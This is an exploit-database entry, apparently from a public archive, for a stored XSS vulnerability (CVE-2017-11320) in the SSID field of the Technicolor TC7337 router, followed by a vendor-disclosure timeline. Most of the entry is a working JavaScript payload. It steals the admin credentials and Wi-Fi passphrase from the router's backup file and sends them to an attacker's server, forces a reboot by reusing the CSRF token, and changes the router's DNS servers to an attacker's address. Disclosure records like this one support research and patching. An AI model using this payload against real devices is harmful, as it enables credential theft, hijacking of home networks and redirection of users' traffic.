{
    "text": "published_time: 2017-08-03 ， id: 36397 ， eid: 42427 ， cve: CVE-2017-11320 ， title: Technicolor TC7337 - 'SSID' Persistent Cross-Site Scripting - Hardware webapps Exploit ， author: Geolado giolado ， published_time: 2017-08-03 ， verified: Not Verified ， platform: Hardware ， exploit_type: webapps ， exploit_url: /download/42427 ， exploit_detail: // Device : Technicolor TC7337\r ， // Vulnerable URL : \r ， // XSS through SSID : '><script src=//url.co></script>   ( Exactly 32 bytes u_u )\r ， //                             ^\r ， //  5char domains are running  |    'src' does not requires quotes , and passing the URL with ony '//'\r ， //  out, grab yours !          +---> it will cause the browser to make the request with the current protocol,\r ， //                                   which is HTTP , duh\r ， // Below is the content of url.co/index.html\r ， // index.html ( which is just a JavaScript actually, but we have to use the index to fit the 32 chars ) :\r ，   // attackers_server = server to send the credentials\r ，   // XSS to get Admin's login/passwd + Wifi passphrase\r ，   // from backup settings\r ，   xmlhttp=new XMLHttpRequest();\r ，   xmlhttp.open(\"GET\", \"/backupsettings.cmd\", false); // GET the Backup XML\r ，   xmlhttp.send();\r ，   var k = xmlhttp.responseText.indexOf(\"Admin\") ; // Search for Admin's Login and Password\r ，   var y = xmlhttp.responseText.indexOf(\"KeyPassphrase\") ; // Search for Wifi PassPhrase\r ，   // Add a img requesting the attacker website with the leaked passwords in the GET parameters\r ，   document.write('<img src=\"'+attackers_server+'?net='+ encodeURIComponent(xmlhttp.responseText.slice(k,k+100)+xmlhttp.responseText.slice(y,y+80))+'\">');\r ，   // XSS + CSRF reboot router\r ，   // Why? Because It's fun to watch a XSS doing 'physical' stuff\r ，   xmlhttp=new XMLHttpRequest();\r ，   xmlhttp.open(\"GET\", \"/resetrouter.html\", false); // GET the page of the reset interface\r ，   xmlhttp.send();\r ，   var w = xmlhttp.responseText.indexOf(\"Key\") ; // Search for the SessionKey, some sort of CSRF Token\r ，   var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes\r ，   xmlhttp=new XMLHttpRequest();\r ，   xmlhttp.open(\"GET\", \"/rebootinfo.cgi?sessionKey=\"+sessionKey, false);\r ， // Request the reboot page with the CSRF token\r ，   xmlhttp.send();\r ，   // attackers_dns = malicious DNS Server\r ，   //  holy shit my code is ugly as fuck , sorry world\r ，   // Alter the DNS Config of the Router\r ，   // changing the Primary and Secondary DNS to the attacker's one\r ，   xmlhttp=new XMLHttpRequest();  \r ，   xmlhttp.open(\"GET\", \"/rede-dnsv4.html\", false); // GET the DNS Config page\r ，   xmlhttp.send();\r ，   var w = xmlhttp.responseText.indexOf(\"Key\") ; // Search for the SessionKey, some sort of CSRF Token\r ，   var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1]; // Regex because the key is inside quotes\r ，   var i_wanip = xmlhttp.responseText.indexOf(\"wanip\");\r ，   var wanip = xmlhttp.responseText.slice(i_wanip,i_wanip+30).match(/'([^']+)'/)[1];\r ，   var i_wansubnet = xmlhttp.responseText.indexOf(\"wansubnet\");\r ，   var wansubnet = xmlhttp.responseText.slice(i_wansubnet,i_wansubnet+30).match(/'([^']+)'/)[1];\r ，   var i_wangatewayip = xmlhttp.responseText.indexOf(\"wangatewayip\");\r ，   var wangatewayip = xmlhttp.responseText.slice(i_wangatewayip,i_wangatewayip+30).match(/'([^']+)'/)[1];\r ，   xmlhttp=new XMLHttpRequest();\r ，   xmlhttp.open(\"GET\", \"/rede-dnsv4.cgi?enblDhcpClnt=0&wanIpAddress=\"+wanip+\"&wanIfName=wanbridge&wanSubnetMask=\"+wansubnet+\"&wanIntfGateway=\"+wangatewayip+\"&dnsPrimary=\"+attackers_dns+\"&dnsSecondary=\"+attackers_dns+\"&sessionKey=\"+sessionKey, false);\r ，   xmlhttp.send(); // Send the request to SAVE the Primary and Secondary DNS with the CSRF Token\r ，   //After saving we need to apply the settings. yeah, fuck logic --'\r ，   //Getting a brand NEW SessionKey\r ，   xmlhttp=new XMLHttpRequest();  \r ，   xmlhttp.open(\"GET\", \"/rede-dnsv4.html\", false); // GET the DNS Config page\r ，   xmlhttp.send();\r ，   var w = xmlhttp.responseText.indexOf(\"Key\") ; // Search for the SessionKey, some sort of CSRF Token\r ，   var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes\r ，   xmlhttp=new XMLHttpRequest();  \r ，   xmlhttp.open(\"GET\", \"/wandnscfg.cmd?sessionKey=\"+sessionKey, false);\r ， // GET the apply DNS page\r ，   xmlhttp.send();\r ， //Choose your path !\r ， //get_passwords(\" ;\r ， //reboot_router();\r ， dns_poisoning(\"1.3.3.7\")\r ， // TimeLine\r ， // ---------\r ， // 08/07/2017 - First email sent to the vendor (no answer)\r ， // 16/07/2017 - Second email sent to the vendor (no answer)\r ， // 18/07/2017 - Third email sent to the vendor (no answer)\r ， // 02/08/2017 - Full Disclosure"
}